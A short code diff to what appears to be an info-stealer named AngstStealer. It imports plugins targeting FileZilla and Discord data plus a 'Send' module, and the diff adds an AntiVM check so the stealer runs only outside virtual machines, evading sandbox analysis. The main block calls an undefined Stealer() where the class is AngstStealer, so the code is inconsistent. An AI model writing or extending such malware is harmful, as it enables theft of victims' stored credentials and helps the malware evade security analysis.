@@ -6,6 +6,7 @@ import itertools
 import sys
 import threading
 from colorama import *
+from plugins.antivm import AntiVM
 from plugins.filezilla import FileZilla
 from plugins.discord import Discord
 from plugins.send import Send
@@ -85,4 +86,5 @@ class AngstStealer():
 init(convert=True)
 
 if __name__ == "__main__":
-    AngstStealer()
+    if AntiVM().inVM() == False:
+        Stealer()
